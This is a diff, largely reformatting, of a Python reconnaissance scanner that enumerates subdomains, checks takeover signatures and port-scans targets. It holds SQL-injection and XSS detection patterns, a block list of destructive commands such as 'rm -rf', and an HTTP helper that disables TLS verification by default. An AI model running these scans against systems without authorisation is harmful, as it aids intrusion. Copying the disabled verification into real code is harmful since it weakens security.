r'(\\b(union|select|insert|update|delete|drop|create|alter)\\b|--|\\'|\"|\\;)',\n+            re.IGNORECASE,\n+        ),\n+        \"xss_patterns\": re.compile(\n+            r\"(javascript:|data:|vbscript:|onload|onerror|onclick)\", re.IGNORECASE\n+        ),\n     }\n-    \n+\n     @staticmethod\n     def validate_domain(domain: str, logger=None) -> bool:\n         \"\"\"Enhanced domain validation with detailed error reporting\"\"\"\n         if logger is None:\n             logger = PantheonLogger(\"DOMAIN_VALIDATOR\")\n-            \n+\n         if not isinstance(domain, str):\n             logger.error(f\"Domain must be a string, got {type(domain).__name__}\")\n             return False\n-            \n+\n         if not domain:\n             logger.error(\"Domain cannot be empty\")\n             return False\n-            \n+\n         if len(domain) > 255:\n             logger.error(f\"Domain too long: {len(domain)} > 255 characters\")\n             return False\n-        \n+\n         # Remove protocol if present\n-        clean_domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')\n-        clean_domain = clean_domain.split('/')[0].split(':')[0]\n-        \n-        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$'\n+        clean_domain = (\n+            domain.replace(\"http://\", \"\").replace(\"https://\", \"\").replace(\"www.\", \"\")\n+        )\n+        clean_domain = clean_domain.split(\"/\")[0].split(\":\")[0]\n+\n+        domain_pattern = r\"^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$\"\n         if not re.match(domain_pattern, clean_domain):\n             logger.error(f\"Invalid domain format: {domain}\")\n-            logger.info(\"Domain should be in format: example.com or subdomain.example.com\")\n+            logger.info(\n+                \"Domain should be in format: example.com or subdomain.example.com\"\n+            )\n             return False\n-            \n-        if clean_domain.count('.') == 0:\n+\n+        if clean_domain.count(\".\") == 0:\n             logger.warning(f\"Domain appears incomplete: {clean_domain} (missing TLD?)\")\n-            \n+\n         return True\n-    \n+\n     @staticmethod\n     def validate_ip(ip: str, logger=None) -> bool:\n         \"\"\"Enhanced IP validation with detailed error reporting\"\"\"\n         if logger is None:\n             logger = PantheonLogger(\"IP_VALIDATOR\")\n-            \n+\n         if not isinstance(ip, str):\n             logger.error(f\"IP must be a string, got {type(ip).__name__}\")\n             return False\n-            \n+\n         if not ip:\n             logger.error(\"IP address cannot be empty\")\n             return False\n-            \n+\n         try:\n             ip_obj = ipaddress.ip_address(ip)\n-            \n+\n             # Provide context about IP types\n             if ip_obj.is_private:\n                 logger.info(f\"Private IP address detected: {ip}\")\n             elif ip_obj.is_loopback:\n                 logger.info(f\"Loopback IP address detected: {ip}\")\n             elif ip_obj.is_multicast:\n-                logger.warning(f\"Multicast IP address: {ip} (may not be suitable for scanning)\")\n+                logger.warning(\n+                    f\"Multicast IP address: {ip} (may not be suitable for scanning)\"\n+                )\n             elif ip_obj.is_reserved:\n                 logger.warning(f\"Reserved IP address: {ip} (may not be scannable)\")\n-                \n+\n             return True\n         except ValueError as e:\n             logger.error(f\"Invalid IP address format: {ip} - {e}\")\n             logger.info(\"IP should be in format: 192.168.1.1 or 2001:db8::1\")\n             return False\n-    \n+\n     @staticmethod\n     def validate_url(url: str, logger=None) -> bool:\n         \"\"\"Enhanced URL validation with detailed error reporting\"\"\"\n         if logger is None:\n             logger = PantheonLogger(\"URL_VALIDATOR\")\n-            \n+\n         if not isinstance(url, str):\n             logger.error(f\"URL must be a string, got {type(url).__name__}\")\n             return False\n-            \n+\n         if not url:\n             logger.error(\"URL cannot be empty\")\n             return False\n-            \n+\n         if len(url) > 2048:\n             logger.error(f\"URL too long: {len(url)} > 2048 characters\")\n             return False\n-            \n+\n         try:\n             parsed = urlparse(url)\n-            \n+\n             if not parsed.scheme:\n                 logger.error(f\"URL missing protocol: {url}\")\n                 logger.info(\"URL should start with http:// or https://\")\n                 return False\n-                \n-            if parsed.scheme not in ['http', 'https']:\n+\n+            if parsed.scheme not in [\"http\", \"https\"]:\n                 logger.error(f\"Unsupported URL protocol: {parsed.scheme}\")\n                 logger.info(\"Only HTTP and HTTPS protocols are supported\")\n                 return False\n-                \n+\n             if not parsed.netloc:\n                 logger.error(f\"URL missing host/domain: {url}\")\n                 logger.info(\"URL should include a valid domain name\")\n                 return False\n-                \n+\n             return True\n         except Exception as e:\n             logger.error(f\"URL parsing error: {url} - {e}\")\n             return False\n-    \n+\n     @staticmethod\n     def sanitize_input(input_str: str) -> str:\n         \"\"\"Sanitize user input to prevent injection attacks\"\"\"\n         if not isinstance(input_str, str):\n             return str(input_str)\n-        \n+\n         # HTML encode dangerous characters\n         sanitized = html.escape(input_str)\n-        \n+\n         # Remove dangerous patterns\n         for pattern_name, pattern in SecurityValidator.DANGEROUS_PATTERNS.items():\n-            sanitized = pattern.sub('', sanitized)\n-        \n+            sanitized = pattern.sub(\"\", sanitized)\n+\n         return sanitized\n-    \n+\n     @staticmethod\n     def validate_file_path(path: str) -> bool:\n         \"\"\"Validate file path to prevent path traversal\"\"\"\n         try:\n             # Resolve path and check if it's within allowed directories\n             resolved_path = Path(path).resolve()\n             current_dir = Path.cwd()\n-            \n+\n             # Check if path is within current directory tree\n             try:\n                 resolved_path.relative_to(current_dir)\n                 return True\n             except ValueError:\n                 return False\n         except Exception:\n             return False\n \n+\n # ============================================================================\n # ENHANCED ERROR HANDLING SYSTEM\n # ============================================================================\n \n-def safe_execute_master(func, *args, default=None, error_msg=\"Operation failed\", \n-                       log_level=\"ERROR\", logger=None, **kwargs):\n+\n+def safe_execute_master(\n+    func,\n+    *args,\n+    default=None,\n+    error_msg=\"Operation failed\",\n+    log_level=\"ERROR\",\n+    logger=None,\n+    **kwargs,\n+):\n     \"\"\"Enhanced safe execution with detailed error handling for master script\"\"\"\n     if logger is None:\n         logger = PantheonLogger(\"SAFE_EXECUTE\")\n-    \n+\n     try:\n         return func(*args, **kwargs)\n     except FileNotFoundError as e:\n         filepath = str(e).split(\"'\")[1] if \"'\" in str(e) else \"unknown\"\n         logger.error(f\"{error_msg} - File not found: {filepath}\")\n-        logger.info(f\"Recovery: Check if file exists, verify path permissions, or create missing directory\")\n+        logger.info(\n+            f\"Recovery: Check if file exists, verify path permissions, or create missing directory\"\n+        )\n         return default\n     except PermissionError as e:\n         filepath = str(e).split(\"'\")[1] if \"'\" in str(e) else \"unknown\"\n         logger.error(f\"{error_msg} - Permission denied: {filepath}\")\n-        logger.info(f\"Recovery: Run with appropriate permissions or check file/directory ownership\")\n+        logger.info(\n+            f\"Recovery: Run with appropriate permissions or check file/directory ownership\"\n+        )\n         return default\n     except subprocess.TimeoutExpired as e:\n-        cmd = getattr(e, 'cmd', 'unknown command')\n-        timeout_val = getattr(e, 'timeout', 'unknown')\n+        cmd = getattr(e, \"cmd\", \"unknown command\")\n+        timeout_val = getattr(e, \"timeout\", \"unknown\")\n         logger.error(f\"{error_msg} - Timeout after {timeout_val}s: {cmd}\")\n-        logger.info(f\"Recovery: Increase timeout, reduce scan scope, or check network connectivity\")\n+        logger.info(\n+            f\"Recovery: Increase timeout, reduce scan scope, or check network connectivity\"\n+        )\n         return default\n     except subprocess.CalledProcessError as e:\n-        cmd = e.cmd if hasattr(e, 'cmd') else 'unknown'\n-        returncode = e.returncode if hasattr(e, 'returncode') else 'unknown'\n+        cmd = e.cmd if hasattr(e, \"cmd\") else \"unknown\"\n+        returncode = e.returncode if hasattr(e, \"returncode\") else \"unknown\"\n         logger.error(f\"{error_msg} - Command failed (exit code: {returncode}): {cmd}\")\n         return default\n     except ConnectionError as e:\n         logger.error(f\"{error_msg} - Network connection error: {e}\")\n-        logger.info(f\"Recovery: Check internet connectivity, proxy settings, or target availability\")\n+        logger.info(\n+            f\"Recovery: Check internet connectivity, proxy settings, or target availability\"\n+        )\n         return default\n     except Exception as e:\n         error_type = type(e).__name__\n         logger.error(f\"{error_msg} - {error_type}: {e}\")\n-        \n+\n         # Provide contextual recovery suggestions\n         error_str = str(e).lower()\n-        if 'connection' in error_str or 'network' in error_str:\n+        if \"connection\" in error_str or \"network\" in error_str:\n             logger.info(\"Recovery: Check network connectivity and firewall settings\")\n-        elif 'memory' in error_str or 'resource' in error_str:\n+        elif \"memory\" in error_str or \"resource\" in error_str:\n             logger.info(\"Recovery: Free up system resources or reduce scan intensity\")\n-        elif 'configuration' in error_str or 'config' in error_str:\n-            logger.info(\"Recovery: Verify configuration file syntax and required settings\")\n+        elif \"configuration\" in error_str or \"config\" in error_str:\n+            logger.info(\n+                \"Recovery: Verify configuration file syntax and required settings\"\n+            )\n         else:\n-            logger.info(\"Recovery: Check logs, verify input parameters, or try with reduced scope\")\n-        \n+            logger.info(\n+                \"Recovery: Check logs, verify input parameters, or try with reduced scope\"\n+            )\n+\n         return default\n \n-def execute_tool_safely_master(tool_name: str, args: List[str], timeout: int = 300, \n-                              output_file: Optional[Path] = None, logger=None) -> bool:\n+\n+def execute_tool_safely_master(\n+    tool_name: str,\n+    args: List[str],\n+    timeout: int = 300,\n+    output_file: Optional[Path] = None,\n+    logger=None,\n+) -> bool:\n     \"\"\"Enhanced tool execution for master script with fallbacks\"\"\"\n     if logger is None:\n         logger = PantheonLogger(\"TOOL_EXEC\")\n-    \n+\n     # Check tool availability\n     if not shutil.which(tool_name):\n         install_suggestions = {\n-            'nuclei': 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',\n-            'subfinder': 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',\n-            'httpx': 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',\n-            'naabu': 'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',\n-            'nmap': 'apt install nmap',\n-            'sqlmap': 'apt install sqlmap'\n+            \"nuclei\": \"go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\",\n+            \"subfinder\": \"go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\",\n+            \"httpx\": \"go install github.com/projectdiscovery/httpx/cmd/httpx@latest\",\n+            \"naabu\": \"go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest\",\n+            \"nmap\": \"apt install nmap\",\n+            \"sqlmap\": \"apt install sqlmap\",\n         }\n-        \n+\n         suggestion = install_suggestions.get(tool_name, f\"Please install {tool_name}\")\n         logger.warning(f\"Tool '{tool_name}' not available. Install with: {suggestion}\")\n-        \n+\n         # Suggest alternatives for critical tools\n         alternatives = {\n-            'nuclei': 'Consider manual vulnerability testing or use nikto',\n-            'nmap': 'Use netcat for basic port testing',\n-            'subfinder': 'Try manual subdomain enumeration with DNS queries'\n+            \"nuclei\": \"Consider manual vulnerability testing or use nikto\",\n+            \"nmap\": \"Use netcat for basic port testing\",\n+            \"subfinder\": \"Try manual subdomain enumeration with DNS queries\",\n         }\n-        \n+\n         if tool_name in alternatives:\n             logger.info(f\"Alternative: {alternatives[tool_name]}\")\n-        \n+\n         return False\n-    \n+\n     # Enhanced argument validation\n     for i, arg in enumerate(args):\n         if isinstance(arg, str):\n             if len(arg) > 1000:\n-                logger.error(f\"Argument #{i} too long for {tool_name}: {len(arg)} chars\")\n+                logger.error(\n+                    f\"Argument #{i} too long for {tool_name}: {len(arg)} chars\"\n+                )\n                 return False\n-            \n+\n             # Security validation\n-            if any(pattern in arg.lower() for pattern in ['rm -rf', 'format c:', 'del *']):\n+            if any(\n+                pattern in arg.lower() for pattern in [\"rm -rf\", \"format c:\", \"del *\"]\n+            ):\n                 logger.error(f\"Dangerous argument detected for {tool_name}: {arg[:50]}\")\n                 return False\n-    \n+\n     # Execute with enhanced error handling\n     cmd = [tool_name] + args\n     logger.debug(f\"Executing: {tool_name} with {len(args)} arguments\")\n-    \n+\n     result = safe_execute_master(\n         subprocess.run,\n         cmd,\n         capture_output=bool(output_file),\n         text=True,\n         timeout=timeout,\n         check=False,\n         default=None,\n         error_msg=f\"Tool execution failed: {tool_name}\",\n-        logger=logger\n+        logger=logger,\n     )\n-    \n+\n     if result is None:\n-        logger.warning(f\"Tool {tool_name} execution failed - check error messages above\")\n+        logger.warning(\n+            f\"Tool {tool_name} execution failed - check error messages above\"\n+        )\n         return False\n-    \n+\n     # Handle output\n-    if output_file and hasattr(result, 'stdout'):\n+    if output_file and hasattr(result, \"stdout\"):\n         if result.stdout:\n             try:\n                 output_file.parent.mkdir(parents=True, exist_ok=True)\n-                output_file.write_text(result.stdout, encoding='utf-8')\n-                logger.debug(f\"Tool output saved to {output_file} ({len(result.stdout)} chars)\")\n+                output_file.write_text(result.stdout, encoding=\"utf-8\")\n+                logger.debug(\n+                    f\"Tool output saved to {output_file} ({len(result.stdout)} chars)\"\n+                )\n                 return True\n             except Exception as e:\n                 logger.error(f\"Failed to save output to {output_file}: {e}\")\n                 return False\n         else:\n             logger.warning(f\"Tool {tool_name} produced no output\")\n             return True\n-    \n-    return hasattr(result, 'returncode') and result.returncode == 0\n-\n-def safe_http_request_master(url: str, method: str = 'GET', timeout: int = 10, \n-                           retries: int = 3, logger=None, **kwargs) -> Optional[Dict[str, Any]]:\n+\n+    return hasattr(result, \"returncode\") and result.returncode == 0\n+\n+\n+def safe_http_request_master(\n+    url: str,\n+    method: str = \"GET\",\n+    timeout: int = 10,\n+    retries: int = 3,\n+    logger=None,\n+    **kwargs,\n+) -> Optional[Dict[str, Any]]:\n     \"\"\"Enhanced HTTP request function for master script\"\"\"\n     if logger is None:\n         logger = PantheonLogger(\"HTTP_REQUEST\")\n-    \n+\n     if not HAS_REQUESTS:\n         logger.error(\"Requests library not available for HTTP operations\")\n-        return {'success': False, 'error': 'missing_dependency', 'message': 'requests not installed'}\n-    \n+        return {\n+            \"success\": False,\n+            \"error\": \"missing_dependency\",\n+            \"message\": \"requests not installed\",\n+        }\n+\n     # URL validation\n     if not SecurityValidator.validate_url(url):\n         logger.error(f\"Invalid URL format: {url}\")\n-        return {'success': False, 'error': 'invalid_url', 'message': 'URL format validation failed'}\n-    \n+        return {\n+            \"success\": False,\n+            \"error\": \"invalid_url\",\n+            \"message\": \"URL format validation failed\",\n+        }\n+\n     try:\n         import requests\n         from requests.adapters import HTTPAdapter\n         from requests.packages.urllib3.util.retry import Retry\n-        \n+\n         # Configure retry strategy\n         retry_strategy = Retry(\n             total=retries,\n             backoff_factor=1,\n             status_forcelist=[429, 500, 502, 503, 504],\n-            allowed_methods=[\"HEAD\", \"GET\", \"OPTIONS\", \"POST\"]\n+            allowed_methods=[\"HEAD\", \"GET\", \"OPTIONS\", \"POST\"],\n         )\n-        \n+\n         session = requests.Session()\n         adapter = HTTPAdapter(max_retries=retry_strategy)\n         session.mount(\"http://\", adapter)\n         session.mount(\"https://\", adapter)\n-        \n+\n         # Set secure headers\n-        headers = kwargs.get('headers', {})\n-        headers.update({\n-            'User-Agent': 'Bl4ckC3ll_PANTHEON_Master/10.0.0 Security Scanner',\n-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n-            'Accept-Language': 'en-US,en;q=0.5',\n-            'Connection': 'keep-alive'\n-        })\n-        kwargs['headers'] = headers\n-        kwargs['timeout'] = timeout\n-        kwargs['verify'] = kwargs.get('verify', False)\n-        \n+        headers = kwargs.get(\"headers\", {})\n+        headers.update(\n+            {\n+                \"User-Agent\": \"Bl4ckC3ll_PANTHEON_Master/10.0.0 Security Scanner\",\n+                \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n+                \"Accept-Language\": \"en-US,en;q=0.5\",\n+                \"Connection\": \"keep-alive\",\n+            }\n+        )\n+        kwargs[\"headers\"] = headers\n+        kwargs[\"timeout\"] = timeout\n+        kwargs[\"verify\"] = kwargs.get(\"verify\", False)\n+\n         logger.debug(f\"Making {method} request to {url}\")\n         response = session.request(method, url, **kwargs)\n-        \n+\n         result = {\n-            'status_code': response.status_code,\n-            'headers': dict(response.headers),\n-            'content': response.text,\n-            'url': str(response.url),\n-            'elapsed': response.elapsed.total_seconds(),\n-            'success': True\n+            \"status_code\": response.status_code,\n+            \"headers\": dict(response.headers),\n+            \"content\": response.text,\n+            \"url\": str(response.url),\n+            \"elapsed\": response.elapsed.total_seconds(),\n+            \"success\": True,\n         }\n-        \n-        logger.debug(f\"HTTP request successful: {url} - {response.status_code} ({response.elapsed.total_seconds():.2f}s)\")\n+\n+        logger.debug(\n+            f\"HTTP request successful: {url} - {response.status_code} ({response.elapsed.total_seconds():.2f}s)\"\n+        )\n         return result\n-        \n+\n     except requests.exceptions.ConnectionError as e:\n         logger.warning(f\"Connection error for {url}: {e}\")\n-        return {'success': False, 'error': 'connection_error', 'message': str(e)}\n+        return {\"success\": False, \"error\": \"connection_error\", \"message\": str(e)}\n     except requests.exceptions.Timeout as e:\n         logger.warning(f\"Request timeout for {url}: {e}\")\n-        return {'success': False, 'error': 'timeout', 'message': str(e)}\n+        return {\"success\": False, \"error\": \"timeout\", \"message\": str(e)}\n     except requests.exceptions.RequestException as e:\n         logger.warning(f\"Request error for {url}: {e}\")\n-        return {'success': False, 'error': 'request_error', 'message': str(e)}\n+        return {\"success\": False, \"error\": \"request_error\", \"message\": str(e)}\n     except Exception as e:\n         logger.error(f\"Unexpected error making request to {url}: {e}\")\n-        return {'success': False, 'error': 'unexpected_error', 'message': str(e)}\n+        return {\"success\": False, \"error\": \"unexpected_error\", \"message\": str(e)}\n+\n \n # ============================================================================\n # ENHANCED LOGGING SYSTEM\n # ============================================================================\n \n+\n class PantheonLogger:\n     \"\"\"Enhanced logging system with security awareness\"\"\"\n-    \n+\n     def __init__(self, name=\"PANTHEON\", log_level=logging.INFO):\n         self.logger = logging.getLogger(name)\n         self.logger.setLevel(log_level)\n-        \n+\n         if not self.logger.handlers:\n             # Console handler\n             console_handler = logging.StreamHandler()\n             console_formatter = logging.Formatter(\n-                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'\n+                \"%(asctime)s - %(name)s - %(levelname)s - %(message)s\"\n             )\n             console_handler.setFormatter(console_formatter)\n             self.logger.addHandler(console_handler)\n-            \n+\n             # File handler\n             try:\n-                log_file = Path.cwd() / \"logs\" / f\"pantheon_{datetime.now().strftime('%Y%m%d')}.log\"\n+                log_file = (\n+                    Path.cwd()\n+                    / \"logs\"\n+                    / f\"pantheon_{datetime.now().strftime('%Y%m%d')}.log\"\n+                )\n                 log_file.parent.mkdir(parents=True, exist_ok=True)\n                 file_handler = logging.FileHandler(log_file)\n                 file_handler.setFormatter(console_formatter)\n                 self.logger.addHandler(file_handler)\n             except Exception as e:\n-                logging.warning(f\"Operation failed: {e}\")  # Continue without file logging if not possible\n-    \n+                logging.warning(\n+                    f\"Operation failed: {e}\"\n+                )  # Continue without file logging if not possible\n+\n     def info(self, message: str):\n         \"\"\"Log info message\"\"\"\n         self.logger.info(SecurityValidator.sanitize_input(message))\n-    \n+\n     def warning(self, message: str):\n         \"\"\"Log warning message\"\"\"\n         self.logger.warning(SecurityValidator.sanitize_input(message))\n-    \n+\n     def error(self, message: str):\n         \"\"\"Log error message\"\"\"\n         self.logger.error(SecurityValidator.sanitize_input(message))\n-    \n+\n     def debug(self, message: str):\n         \"\"\"Log debug message\"\"\"\n         self.logger.debug(SecurityValidator.sanitize_input(message))\n-    \n+\n     def success(self, message: str):\n         \"\"\"Log success message with special formatting\"\"\"\n         self.logger.info(f\"\u2705 {SecurityValidator.sanitize_input(message)}\")\n \n+\n # ============================================================================\n # BCAR ENHANCED RECONNAISSANCE SYSTEM\n # ============================================================================\n \n+\n class BCARCore:\n     \"\"\"Enhanced Bug Bounty Certificate Authority Reconnaissance\"\"\"\n-    \n+\n     def __init__(self, logger=None):\n         self.logger = logger or PantheonLogger(\"BCAR\")\n         self.session = requests.Session() if HAS_REQUESTS else None\n         if self.session:\n-            self.session.headers.update({\n-                'User-Agent': 'Mozilla/5.0 (compatible; BCAR/1.0; +https://github.com/cxb3rf1lth)'\n-            })\n+            self.session.headers.update(\n+                {\n+                    \"User-Agent\": \"Mozilla/5.0 (compatible; BCAR/1.0; +https://github.com/cxb3rf1lth)\"\n+                }\n+            )\n         self.found_subdomains = set()\n         self.found_endpoints = set()\n         self.certificates = []\n         self.vulnerabilities = []\n-    \n-    def certificate_transparency_search(self, domain: str, limit: int = 1000) -> List[str]:\n+\n+    def certificate_transparency_search(\n+        self, domain: str, limit: int = 1000\n+    ) -> List[str]:\n         \"\"\"Search certificate transparency logs for subdomains\"\"\"\n         if not SecurityValidator.validate_domain(domain):\n             self.logger.error(f\"Invalid domain: {domain}\")\n             return []\n-        \n+\n         subdomains = set()\n-        \n+\n         if not self.session:\n             self.logger.warning(\"Requests module not available, skipping CT search\")\n             return list(subdomains)\n-        \n+\n         # Certificate transparency sources\n         ct_sources = [\n             f\"https://crt.sh/?q=%.{domain}&output=json\",\n-            f\"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names\"\n+            f\"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names\",\n         ]\n-        \n+\n         for source in ct_sources:\n             try:\n                 self.logger.info(f\"Searching CT logs: {source}\")\n                 response = self.session.get(source, timeout=30)\n-                \n+\n                 if response.status_code == 200:\n-                    if 'crt.sh' in source:\n+                    if \"crt.sh\" in source:\n                         data = response.json()\n                         for cert in data[:limit]:\n-                            name_value = cert.get('name_value', '')\n-                            for subdomain in name_value.split('\\n'):\n+                            name_value = cert.get(\"name_value\", \"\")\n+                            for subdomain in name_value.split(\"\\n\"):\n                                 subdomain = subdomain.strip()\n-                                if subdomain and SecurityValidator.validate_domain(subdomain):\n+                                if subdomain and SecurityValidator.validate_domain(\n+                                    subdomain\n+                                ):\n                                     subdomains.add(subdomain)\n-                    \n-                    elif 'certspotter' in source:\n+\n+                    elif \"certspotter\" in source:\n                         data = response.json()\n                         for cert in data[:limit]:\n-                            dns_names = cert.get('dns_names', [])\n+                            dns_names = cert.get(\"dns_names\", [])\n                             for name in dns_names:\n                                 if SecurityValidator.validate_domain(name):\n                                     subdomains.add(name)\n-                                    \n+\n             except Exception as e:\n                 self.logger.error(f\"CT search failed for {source}: {e}\")\n-        \n+\n         self.found_subdomains.update(subdomains)\n         return list(subdomains)\n-    \n-    def advanced_subdomain_enumeration(self, domain: str, wordlist: List[str] = None) -> List[str]:\n+\n+    def advanced_subdomain_enumeration(\n+        self, domain: str, wordlist: List[str] = None\n+    ) -> List[str]:\n         \"\"\"Perform advanced subdomain enumeration\"\"\"\n         if not SecurityValidator.validate_domain(domain):\n             return []\n-        \n+\n         found_subs = set()\n         wordlist = wordlist or self._get_default_wordlist()\n-        \n+\n         def check_subdomain(subdomain):\n             try:\n                 full_domain = f\"{subdomain}.{domain}\"\n                 if SecurityValidator.validate_domain(full_domain):\n                     # Try DNS resolution\n@@ -648,289 +757,362 @@\n                     found_subs.add(full_domain)\n                     return full_domain\n             except Exception as e:\n                 logging.warning(f\"Unexpected error: {e}\")\n             return None\n-        \n+\n         # Multi-threaded subdomain checking\n         with ThreadPoolExecutor(max_workers=50) as executor:\n             futures = [executor.submit(check_subdomain, sub) for sub in wordlist[:1000]]\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n                     self.logger.info(f\"Found subdomain: {result}\")\n-        \n+\n         return list(found_subs)\n-    \n+\n     def subdomain_takeover_check(self, subdomains: List[str]) -> List[Dict[str, Any]]:\n         \"\"\"Check for subdomain takeover vulnerabilities\"\"\"\n         vulnerable_subdomains = []\n-        \n+\n         # Takeover signatures for various cloud services\n         takeover_signatures = {\n-            'AWS S3': ['NoSuchBucket', 'The specified bucket does not exist'],\n-            'GitHub Pages': ['There isn\\'t a GitHub Pages site here', 'For root URLs'],\n-            'Heroku': ['no-such-app.herokuapp.com', 'herokucdn.com/error-pages'],\n-            'Azure': ['404 Web Site not found', 'Error 404 - Web app not found'],\n-            'Shopify': ['Sorry, this shop is currently unavailable'],\n-            'Fastly': ['Fastly error: unknown domain'],\n-            'CloudFront': ['ERROR: The request could not be satisfied'],\n-            'Tumblr': ['Whatever you were looking for doesn\\'t currently exist'],\n-            'WordPress.com': ['Do you want to register'],\n-            'Bitbucket': ['Repository not found'],\n-            'Ghost': ['The thing you were looking for is no longer here'],\n-            'Surge.sh': ['project not found'],\n-            'Zendesk': ['Help Center Closed']\n+            \"AWS S3\": [\"NoSuchBucket\", \"The specified bucket does not exist\"],\n+            \"GitHub Pages\": [\"There isn't a GitHub Pages site here\", \"For root URLs\"],\n+            \"Heroku\": [\"no-such-app.herokuapp.com\", \"herokucdn.com/error-pages\"],\n+            \"Azure\": [\"404 Web Site not found\", \"Error 404 - Web app not found\"],\n+            \"Shopify\": [\"Sorry, this shop is currently unavailable\"],\n+            \"Fastly\": [\"Fastly error: unknown domain\"],\n+            \"CloudFront\": [\"ERROR: The request could not be satisfied\"],\n+            \"Tumblr\": [\"Whatever you were looking for doesn't currently exist\"],\n+            \"WordPress.com\": [\"Do you want to register\"],\n+            \"Bitbucket\": [\"Repository not found\"],\n+            \"Ghost\": [\"The thing you were looking for is no longer here\"],\n+            \"Surge.sh\": [\"project not found\"],\n+            \"Zendesk\": [\"Help Center Closed\"],\n         }\n-        \n+\n         def check_takeover(subdomain):\n             if not self.session:\n                 return None\n-                \n+\n             try:\n                 response = self.session.get(f\"http://{subdomain}\", timeout=10)\n                 content = response.text.lower()\n-                \n+\n                 for service, signatures in takeover_signatures.items():\n                     for signature in signatures:\n                         if signature.lower() in content:\n                             return {\n-                                'subdomain': subdomain,\n-                                'service': service,\n-                                'signature': signature,\n-                                'status_code': response.status_code,\n-                                'confidence': 'high'\n+                                \"subdomain\": subdomain,\n+                                \"service\": service,\n+                                \"signature\": signature,\n+                                \"status_code\": response.status_code,\n+                                \"confidence\": \"high\",\n                             }\n             except Exception as e:\n                 logging.warning(f\"Unexpected error: {e}\")\n             return None\n-        \n+\n         # Check subdomains for takeover vulnerabilities\n         with ThreadPoolExecutor(max_workers=20) as executor:\n             futures = [executor.submit(check_takeover, sub) for sub in subdomains]\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n                     vulnerable_subdomains.append(result)\n-                    self.logger.warning(f\"Potential takeover: {result['subdomain']} -> {result['service']}\")\n-        \n+                    self.logger.warning(\n+                        f\"Potential takeover: {result['subdomain']} -> {result['service']}\"\n+                    )\n+\n         return vulnerable_subdomains\n-    \n+\n     def _get_default_wordlist(self) -> List[str]:\n         \"\"\"Get default subdomain wordlist\"\"\"\n         return [\n-            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2',\n-            'cpanel', 'whm', 'autodiscover', 'autoconfig', 'ssl', 'secure', 'imap', 'sftp',\n-            'admin', 'api', 'blog', 'dev', 'test', 'staging', 'demo', 'app', 'mobile', 'm',\n-            'beta', 'alpha', 'portal', 'dashboard', 'cms', 'shop', 'store', 'support', 'help',\n-            'cdn', 'static', 'media', 'assets', 'img', 'images', 'upload', 'downloads'\n+            \"www\",\n+            \"mail\",\n+            \"ftp\",\n+            \"localhost\",\n+            \"webmail\",\n+            \"smtp\",\n+            \"pop\",\n+            \"ns1\",\n+            \"webdisk\",\n+            \"ns2\",\n+            \"cpanel\",\n+            \"whm\",\n+            \"autodiscover\",\n+            \"autoconfig\",\n+            \"ssl\",\n+            \"secure\",\n+            \"imap\",\n+            \"sftp\",\n+            \"admin\",\n+            \"api\",\n+            \"blog\",\n+            \"dev\",\n+            \"test\",\n+            \"staging\",\n+            \"demo\",\n+            \"app\",\n+            \"mobile\",\n+            \"m\",\n+            \"beta\",\n+            \"alpha\",\n+            \"portal\",\n+            \"dashboard\",\n+            \"cms\",\n+            \"shop\",\n+            \"store\",\n+            \"support\",\n+            \"help\",\n+            \"cdn\",\n+            \"static\",\n+            \"media\",\n+            \"assets\",\n+            \"img\",\n+            \"images\",\n+            \"upload\",\n+            \"downloads\",\n         ]\n+\n \n # ============================================================================\n # ADVANCED SCANNING ENGINE\n # ============================================================================\n \n+\n class AdvancedScanManager:\n     \"\"\"Advanced scanning manager with comprehensive capabilities\"\"\"\n-    \n+\n     def __init__(self, config: Dict[str, Any] = None):\n         self.config = config or DEFAULT_CONFIG\n         self.logger = PantheonLogger(\"ScanManager\")\n         self.session = requests.Session() if HAS_REQUESTS else None\n         self.bcar = BCARCore(self.logger)\n-        \n-    def comprehensive_port_scan(self, targets: List[str], ports: List[int] = None) -> Dict[str, List[int]]:\n+\n+    def comprehensive_port_scan(\n+        self, targets: List[str], ports: List[int] = None\n+    ) -> Dict[str, List[int]]:\n         \"\"\"Perform comprehensive port scanning\"\"\"\n         if ports is None:\n             # Top 1000 ports\n             ports = list(range(1, 1001))\n-        \n+\n         results = {}\n-        \n+\n         def scan_target_port(target, port):\n             try:\n                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                 sock.settimeout(1)\n                 result = sock.connect_ex((target, port))\n                 sock.close()\n                 return port if result == 0 else None\n             except:\n                 return None\n-        \n+\n         for target in targets:\n-            if not SecurityValidator.validate_ip(target) and not SecurityValidator.validate_domain(target):\n+            if not SecurityValidator.validate_ip(\n+                target\n+            ) and not SecurityValidator.validate_domain(target):\n                 continue\n-                \n+\n             self.logger.info(f\"Scanning {target}\")\n             open_ports = []\n-            \n+\n             # Multi-threaded port scanning\n             with ThreadPoolExecutor(max_workers=100) as executor:\n-                futures = [executor.submit(scan_target_port, target, port) for port in ports]\n+                futures = [\n+                    executor.submit(scan_target_port, target, port) for port in ports\n+                ]\n                 for future in as_completed(futures):\n                     result = future.result()\n                     if result:\n                         open_ports.append(result)\n-            \n+\n             results[target] = sorted(open_ports)\n             self.logger.info(f\"Found {len(open_ports)} open ports on {target}\")\n-        